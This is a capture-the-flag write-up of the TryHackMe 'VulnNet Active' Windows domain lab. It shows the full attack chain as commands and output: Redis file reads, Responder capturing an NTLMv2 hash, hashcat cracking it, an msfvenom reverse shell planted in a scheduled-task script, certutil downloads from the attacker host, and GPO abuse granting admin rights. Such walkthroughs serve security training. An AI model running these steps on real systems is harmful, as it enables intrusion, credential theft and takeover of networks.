---
title: VulnNet Active
categories: [TryHackMe]
tags: [Active Directory, SMB, redis-cli, responder, PrivEsc, SharpHound, BloodHound, GenericWrite, SharpGPOAbuse, GPO, PrivEsc]
image:
  path: /Vulnhub-Files/img/VulnNet/front.png
  alt: VulnNet Active TryHackMe Machine 💻 
---

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.75.19  
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 21:29 IST
Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 32.27% done; ETC: 21:35 (0:04:27 remaining)
Nmap scan report for 10.10.75.19
Host is up (0.20s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-01T16:05:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 1s
```
{: .nolineno}

Now with SMB enumeration I can get the access but I got the domain name like this →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet]
└─$ crackmapexec smb 10.10.75.19                                    
SMB         10.10.75.19     445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
```
{: .nolineno}

Now I also got a port for Redis and I got some information about this port from this [site](https://www.notion.so/VulnNet-dbbd1c5f42f94506b270edecc85635b1?pvs=21) and command from this [site](https://exploit-notes.hdks.org/exploit/database/redis-pentesting/) :

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet]
└─$ redis-cli -h 10.10.75.19
10.10.75.19:6379> 
10.10.75.19:6379> info
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:440
run_id:6e293d75a5f16b38ba3ae14b2aee4e9752099b14
tcp_port:6379
uptime_in_seconds:1386
uptime_in_days:0
hz:10
lru_clock:1678563
config_file:

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:953256
used_memory_human:930.91K
used_memory_rss:919712
used_memory_peak:977824
used_memory_peak_human:954.91K
used_memory_lua:36864
mem_fragmentation_ratio:0.96
mem_allocator:dlmalloc-2.8

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1696175993
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:2
total_commands_processed:3
instantaneous_ops_per_sec:0
total_net_input_bytes:138
total_net_output_bytes:0
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.08
used_cpu_user:0.31
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace
(0.52s)
10.10.75.19:6379> info keyspace
# Keyspace
10.10.75.19:6379> config get *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
122) ""
(0.70s)
10.10.75.19:6379> config get databases
1) "databases"
2) "16"
10.10.75.19:6379>
```
{: .nolineno}

I can also read file remotelly through this command →

```bash
> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
```
{: .nolineno}

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet]
└─$ redis-cli -h 10.10.75.19                                                                                
10.10.75.19:6379> 
10.10.75.19:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
(error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
(1.27s)
10.10.75.19:6379>
```
{: .nolineno}

I could able to access this file content so that means I do NTLM relay Attack by running responder in backround mode , so lets try it out now →

```bash
10.10.75.19:6379> eval "dofile('//10.8.83.156/shares')" 0
(error) ERR Error running script (call to f_c8e1044d37a286781e4d3fe1df83e31a49db0798): @user_script:1: cannot open //10.8.83.156/shares: Permission denied 
(3.52s)
10.10.75.19:6379>
```
{: .nolineno}

I ran the responder in background and I captured this →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet]
└─$ sudo responder -I tun0 -dwP -v                            
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.83.156]
    Responder IPv6             [fe80::46bc:f467:dd9a:ee96]
    Challenge set              [random]
    Dont Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-XOISZRIFCN0]
    Responder Domain Name      [51T0.LOCAL]
    Responder DCE-RPC Port     [45799]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.75.19
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:bcd2016fc9e1f951:F857BD47837594AB123EE76E0BF74BC5:0101000000000000807A8A6EB4F4D901C9FBB4FD27FB5A470000000002000800350031005400300001001E00570049004E002D0058004F00490053005A0052004900460043004E00300004003400570049004E002D0058004F00490053005A0052004900460043004E0030002E0035003100540030002E004C004F00430041004C000300140035003100540030002E004C004F00430041004C000500140035003100540030002E004C004F00430041004C0007000800807A8A6EB4F4D90106000400020000000800300030000000000000000000000000300000C1D9B88FE0F232E549DEE2EDADCD23283CB647B0009CC8566115C880D8DD84D60A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00380033002E003100350036000000000000000000
```
{: .nolineno}

Now its time to crack this hash value through hashcat Tool →

```bash
ENTERPRISE-SECURITY::VULNNET:bcd2016fc9e1f951:f857bd47837594ab123ee76e0bf74bc5:0101000000000000807a8a6eb4f4d901c9fbb4fd27fb5a470000000002000800350031005400300001001e00570049004e002d0058004f00490053005a0052004900460043004e00300004003400570049004e002d0058004f00490053005a0052004900460043004e0030002e0035003100540030002e004c004f00430041004c000300140035003100540030002e004c004f00430041004c000500140035003100540030002e004c004f00430041004c0007000800807a8a6eb4f4d90106000400020000000800300030000000000000000000000000300000c1d9b88fe0f232e549dee2edadcd23283cb647b0009cc8566115c880d8dd84d60a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00380033002e003100350036000000000000000000:sand_0873959498
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENTERPRISE-SECURITY::VULNNET:bcd2016fc9e1f951:f857b...000000
Time.Started.....: Sun Oct  1 22:21:42 2023 (7 secs)
Time.Estimated...: Sun Oct  1 22:21:49 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   583.0 kH/s (1.26ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4014080/14344385 (27.98%)
Rejected.........: 0/4014080 (0.00%)
Restore.Point....: 4013056/14344385 (27.98%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: sandi1186 -> sand418
Hardware.Mon.#1..: Util: 78%
```
{: .nolineno}

Now I have the credentials →

```bash
VULNNET\enterprise-security:sand_0873959498
```
{: .nolineno}

I checked the SMB Shares and got these shares →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]
└─$ smbclient -L \\\\10.10.231.107\\ -U enterprise-security
Password for [WORKGROUP\enterprise-security]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Enterprise-Share Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.231.107 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]
└─$ smbclient //10.10.231.107/Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9466623 blocks of size 4096. 4931357 blocks available
smb: \> get PurgeIrrelevantData_1826.ps1
getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_1826.ps1 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
```
{: .nolineno}

I got this file from this `Enterprise-Share` share → 

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]
└─$ cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```
{: .nolineno}

I think this file is working as a schedule task so lets replace with our own reverse shell file with same name →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]
└─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.8.83.156 LPORT=4444 -f psh -o PurgeIrrelevantData_1826.ps1 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1875 bytes
Final size of psh file: 10107 bytes
Saved as: PurgeIrrelevantData_1826.ps1
```
{: .nolineno}

Now lets put this file in SMB in that same share →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]
└─$ smbclient //10.10.231.107/Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 24 04:15:41 2021
  ..                                  D        0  Wed Feb 24 04:15:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Wed Feb 24 06:03:18 2021

		9466623 blocks of size 4096. 5040558 blocks available
smb: \> put ../PurgeIrrelevantData_1826.ps1 
putting file ../PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (13.4 kb/s) (average 13.4 kb/s)
smb: \>
```
{: .nolineno}

I also ran the Bloodhound tool as It is a active directory machine and I need to find the graphical view to the Administrator that is why →

Got the reverse shell →

```powershell
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.83.156] from (UNKNOWN) [10.10.231.107] 49817
Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\enterprise-security\Downloads> dir

    Directory: C:\Users\enterprise-security\Downloads

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad                                                
d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402                                                    
-a----        2/26/2021  10:37 AM            143 startup.bat                                                           

PS C:\Users\enterprise-security\Downloads> whoami /all

USER INFORMATION
----------------

User Name                   SID                                         
=========================== ============================================
vulnnet\enterprise-security S-1-5-21-1405206085-1650434706-76331420-1103

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\Users\enterprise-security\Downloads> PS C:\Users\enterprise-security\Downloads>
```
{: .nolineno}

Now I uploaded the `SharpHound.exe` file that will collect the Data for BloodHound Tool in the zip format and then I will be trasfering those file to attackers machine →

```powershell
PS C:\Users\enterprise-security\Downloads> certutil.exe -urlcache -f http://10.8.83.156/SharpHound.exe SharpHound.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\enterprise-security\Downloads> .\SharpHound.exe

2023-10-05T22:33:40.3553381-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-10-05T22:33:51.7903121-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-10-05T22:33:53.4652933-07:00|INFORMATION|Initializing SharpHound at 10:33 PM on 10/5/2023
2023-10-05T22:34:26.3864629-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for vulnnet.local : VULNNET-BC3TCK1SHNQ.vulnnet.local
2023-10-05T22:34:31.1159588-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-10-05T22:34:46.9662445-07:00|INFORMATION|Beginning LDAP search for vulnnet.local
2023-10-05T22:34:50.8515123-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-10-05T22:34:50.9315755-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-10-05T22:35:17.7885347-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 31 MB RAM
2023-10-05T22:35:48.1022481-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM
2023-10-05T22:36:18.4117379-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-10-05T22:36:48.7559981-07:00|INFORMATION|Status: 52 objects finished (+52 0.4262295)/s -- Using 39 MB RAM
2023-10-05T22:36:49.5546040-07:00|INFORMATION|Consumers finished, closing output channel
2023-10-05T22:36:54.0183953-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-10-05T22:37:12.5516466-07:00|INFORMATION|Status: 93 objects finished (+41 0.6413793)/s -- Using 38 MB RAM
2023-10-05T22:37:12.6317401-07:00|INFORMATION|Enumeration finished in 00:02:26.0604302
2023-10-05T22:37:21.4341789-07:00|INFORMATION|Saving cache with stats: 52 ID to type mappings.
 52 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-10-05T22:37:22.3358989-07:00|INFORMATION|SharpHound Enumeration Completed at 10:37 PM on 10/5/2023! Happy Graphing!
PS C:\Users\enterprise-security\Downloads> PS C:\Users\enterprise-security\Downloads> dir

    Directory: C:\Users\enterprise-security\Downloads

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/23/2021   2:29 PM                nssm-2.24-101-g897c7ad                                                
d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402                                                    
-a----        10/5/2023  10:37 PM          11446 20231005223636_BloodHound.zip                                         
-a----        10/5/2023  10:32 PM        1046528 SharpHound.exe                                                        
-a----        2/26/2021  10:37 AM            143 startup.bat                                                           
-a----        10/5/2023  10:37 PM           7851 Y2Q3NzU4MTgtZWE0Ny00ZGJjLTg4MDAtM2NjYjJmZTZjN2U2.bin                  

PS C:\Users\enterprise-security\Downloads>
```
{: .nolineno}

Now I have to get it into my attackers machine so lets get it through SMB shares like this →

```powershell
PS C:\Enterprise-Share> cp C:\Users\enterprise-security\Downloads\20231005223636_BloodHound.zip .    
PS C:\Enterprise-Share> dir

    Directory: C:\Enterprise-Share

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        10/5/2023  10:37 PM          11446 20231005223636_BloodHound.zip                                         
-a----        10/5/2023  10:18 PM          10107 PurgeIrrelevantData_1826.ps1                                          

PS C:\Enterprise-Share>
```
{: .nolineno}

Form SMB →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet/secretdump]
└─$ smbclient //10.10.113.65/Enterprise-Share -U enterprise-security
Password for [WORKGROUP\enterprise-security]:

Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Fri Oct  6 11:14:58 2023
  ..                                  D        0  Fri Oct  6 11:14:58 2023
  20231005223636_BloodHound.zip       A    11446  Fri Oct  6 11:07:19 2023
  PurgeIrrelevantData_1826.ps1        A    10107  Fri Oct  6 10:48:41 2023
get 
		9558271 blocks of size 4096. 5133451 blocks available
smb: \> get 20231005223636_BloodHound.zip 
getting file \20231005223636_BloodHound.zip of size 11446 as 20231005223636_BloodHound.zip (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
smb: \> exit
```
{: .nolineno}

Now through BloodHound tool I got to know about GPO Generic Write permission enabled like this way I will be part of `SECURITY-POL-VN@VULNNET.LOCAL` group →

![Untitled](/Vulnhub-Files/img/VulnNet/Untitled.png)

Now I will be using a Tool called as [SharpGPOAbuse.exe](https://github.com/byronkg/SharpGPOAbuse/blob/main/SharpGPOAbuse-master/SharpGPOAbuse.exe) to Abuse the GPO of `SECURITY-POL-VN@VULNNET.LOCAL` and adding the user enterprise-security in Administrators group like this →

```powershell
PS C:\Enterprise-Share> certutil.exe -urlcache -f http://10.8.83.156/SharpGPOAbuse.exe SharpGPOAbuse.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "babbadeckl_privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN" --Force
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
PS C:\Enterprise-Share> 

```
{: .nolineno}

Now I have to reset the group policies or can say GPOs with this command →

```powershell
PS C:\Enterprise-Share> gpupdate \force
```
{: .nolineno}

After sometime I checked and it did work , am I ( enterprise-security ) user is the part of Administrators group now →

```powershell
PS C:\Enterprise-Share> net users enterprise-security
User name                    enterprise-security
Full Name                    Enterprise Security
Comment                      TryHackMe
Users comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2021 4:01:37 PM
Password expires             Never
Password changeable          2/24/2021 4:01:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/5/2023 10:13:35 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         
The command completed successfully.

PS C:\Enterprise-Share> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
enterprise-security
The command completed successfully.

PS C:\Enterprise-Share>
```
{: .nolineno}

Now I am the Admin considerate so lets see the last FLAG now through SMB shares on `C$` →

```powershell
┌──(kali㉿kali)-[~/Downloads/Tryhackme/VulnNet]
└─$ smbclient //10.10.235.137/C$ -U enterprise-security
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Wed Feb 24 03:33:20 2021
  Documents and Settings          DHSrn        0  Tue Feb 23 10:11:41 2021
  Enterprise-Share                    D        0  Fri Oct  6 15:55:08 2023
  pagefile.sys                      AHS 1073741824  Fri Oct  6 15:45:14 2023
  PerfLogs                            D        0  Tue Feb 23 12:02:00 2021
  Program Files                      DR        0  Tue Feb 23 01:15:53 2021
  Program Files (x86)                 D        0  Tue Feb 23 01:16:06 2021
  ProgramData                       DHn        0  Fri Oct  6 16:03:44 2023
  Recovery                         DHSn        0  Tue Feb 23 01:12:20 2021
  System Volume Information         DHS        0  Tue Feb 23 14:41:25 2021
  Users                              DR        0  Wed Feb 24 03:32:40 2021
  Windows                             D        0  Mon Mar  1 01:46:44 2021

		9558271 blocks of size 4096. 5140078 blocks available
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> dir
  .                                  DR        0  Wed Feb 24 09:57:33 2021
  ..                                 DR        0  Wed Feb 24 09:57:33 2021
  desktop.ini                       AHS      282  Tue Feb 23 03:25:21 2021
  system.txt                          A       37  Wed Feb 24 09:57:45 2021

		9558271 blocks of size 4096. 5139822 blocks available
smb: \Users\Administrator\Desktop\> get system.txt
getting file \Users\Administrator\Desktop\system.txt of size 37 as system.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Users\Administrator\Desktop\>
```
{: .nolineno}

Now I am the Administrator !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }